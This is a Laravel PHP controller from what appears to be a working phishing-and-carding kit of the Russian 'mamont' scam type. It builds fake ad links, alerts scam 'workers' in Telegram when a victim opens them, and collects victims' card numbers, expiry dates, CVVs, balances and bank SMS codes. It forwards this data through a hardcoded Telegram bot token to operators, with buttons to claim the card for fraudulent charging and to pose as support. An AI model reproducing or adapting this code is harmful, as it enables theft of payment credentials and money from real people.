<?php

namespace App\Http\Controllers;

use App\Enum\LidInfoEnum;
use App\Models\Bievers;
use App\Models\LidInfo;
use App\Models\Order;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class OrderController extends Controller
{
    public $token = '7492082975:AAFAq4YYxA4bwu6TQyxR-gbqLAL1pcHsuUE';
    public function show($unique_id)
    {
        $order = Order::where('unique_id', $unique_id)->firstOrFail();

        $message = "Мамонтёнок перешёл по ссылке с названием: " . $order->ad_name;
        $this->sendMessage($message, $order->worker_id);

        return view('order.details', compact('order'));
    }

    public function banks($unique_id)
    {
        $order = Order::where('unique_id', $unique_id)->firstOrFail();

        $message = "Мамонтёнок перешёл в раздел банков, объявление: " . $order->ad_name;
        $this->sendMessage($message, $order->worker_id);

        return view('order.banks', compact('order'));
    }

    public function writeBalance(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "Мамонтёнок вводит баланс, объявление: " . $order->ad_name;
        $wbiv = $message . "\n\n💳 *Карта*: `" . $request->input('card') . "`" .
    "\n🕰 *Дата*: " . $request->input('expiryDate') .
    "\n🤫 *CVV*: `" . $request->input('cvv') . "`" .
    "\n\n🥷 *Воркер*: " . $order->username;

        $this->sendMessage($message, $order->worker_id);

        if ($order->vbiv) {
            $this->sendMessageWithInline($wbiv, $order->vbiv, $order->unique_id);
            return response()->json();
        }

        foreach (Bievers::all() as $bievers) {
            $this->sendMessageVbivGetWork($wbiv, $bievers->biever_id, $order, LidInfoEnum::TYPE_CARD);
        }

        return response()->json();
    }

    public function sendLog(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "ЕСТЬ лог баланса, объявление: " . $order->ad_name;
        $wbiv = $message . "\n\n💳 *Карта*: `" . $request->input('card') . "`" .
            "\n🕰 *Дата*: " . $request->input('expiryDate') .
            "\n🤫 *CVV*: `" . $request->input('cvv') . "`" .
            "\n💷 *Баланс*: " . $request->input('balance') .
            "\n\n🥷 *Воркер*: " . $order->username;
        $this->sendMessage($message, $order->worker_id);

        if ($order->vbiv) {
            $this->sendMessageWithInline($wbiv, $order->vbiv, $order->unique_id);
            return response()->json();
        }

        foreach (Bievers::all() as $bievers) {
            $this->sendMessageVbivGetWork($wbiv, $bievers->biever_id, $order, LidInfoEnum::TYPE_CARD);
        }

        return response()->json();
    }

    public function sendCode(Request $request)
    {
        $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();

        $message = "СМС от банка, объявление: " . $order->ad_name;
        $wbiv = $message . "\n✉️ *Код*: `" . $request->input('code') . "`" .
            "\n\n🥷 *Воркер*: " . $order->username;
        $this->sendMessage($message, $order->worker_id);

        if ($order->vbiv) {
            $this->sendMessageWithInline($wbiv, $order->vbiv, $order->unique_id);
            return response()->json();
        }

        foreach (Bievers::all() as $bievers) {
            $this->sendMessageVbivGetWork($wbiv, $bievers->biever_id, $order, LidInfoEnum::TYPE_SMS_CODE);
        }

        return response()->json();
    }



    public function createNewLink(Request $request) {
        $unique_id = Str::random(9);

        Order::create([
            'unique_id' => $unique_id,
            'worker_id' => $request->worker_id,
            'ad_name' => $request->ad_name,
            'full_name' => $request->full_name,
            'price' => $request->price,
            'address' => $request->address,
//            'country' => $request->country,
            'username' => $request->username
        ]);

        return response()->json(['unique_id' => $unique_id], 200);
    }

    public function getLinks(Request $request)
    {
        $orders = Order::where('worker_id', $request->worker_id)->orderBy('created_at', 'desc')->limit(10)->get();

        $links = $orders->map(function ($order) {
            return '📎 *Название*: ' . $order->ad_name . "\n" .
                '🔗 *Ссылка*: ' . url('/details/' . $order->unique_id) . "\n" .
                '👨 *ФИО*: ' . $order->full_name . "\n" .
                '💷 *Цена*: ' . $order->price . "\n" .
                '📍 *Адресс*: ' . $order->price . "\n\n";
        });

        return response()->json(['links' => $links], 200);
    }

    public function sendMessage($message, $chat_id)
    {
        Http::get('https://api.telegram.org/bot' . $this->token . '/sendMessage', [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]);
    }

    public function sendMessageVbivGetWork($message, $chat_id, $order, $type)
    {
        $id = $order->unique_id;
        $lidInfo = LidInfo::where('unique_id', $id)->where('type', $type)->first();
        if (!$lidInfo) {
            LidInfo::create([
                'unique_id' => $id,
                'type' => $type,
                'info' => $message
            ]);
        } else {
            $lidInfo->info = $message;
            $lidInfo->save();
        }

        Http::get('https://api.telegram.org/bot' . $this->token . '/sendMessage', [
            'chat_id' => $chat_id,
            'text' => 'Новый лог с объявления: *' . $order->ad_name . "*\n*Воркер*: " . $order->username,
            'parse_mode' => 'Markdown',
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [
                        ['text' => 'Взять на вбив', 'callback_data' => 'get-vbiv:' . $id],

                    ]
                ]
            ])
        ]);
    }

    public function sendMessageWithInline($message, $chat_id, $id)
    {
        Http::get('https://api.telegram.org/bot' . $this->token . '/sendMessage', [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown',
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [
                        ['text' => '✍️ Написать от ТП', 'callback_data' => 'chat-vbiv:' . $id],
                        ['text' => '🔔 Открыть Push', 'callback_data' => 'show:open-push:' . $id],
                        ['text' => '✉️ Открыть SMS', 'callback_data' => 'show:open-code:' . $id],
                        ['text' => '📞 Открыть Звонок', 'callback_data' => 'show:open-call:' . $id]
                    ]
                ]
            ])
        ]);
    }

    public function getVbivData(Request $request)
    {
        $vbiv = $request->input('vbiv');
        $order = Order::where('unique_id', $request->input('unique_id'))->first();
        $lidInfos = LidInfo::where('unique_id', $request->input('unique_id'))->where('type', LidInfoEnum::TYPE_CARD)->get();

        if (!empty($order->vbiv) && $order->vbiv !== $vbiv) {
            return response()->json(['liInfo' => null, 'status' => false]);
        }

        $order->vbiv = $vbiv;
        $order->save();

        $data = $lidInfos->map(function ($lidInfo) {
            return $lidInfo->info;
        });

        return response()->json(['lidInfo' => $data, 'status' => true, 'worker_id' => $order->worker_id]);
    }
}
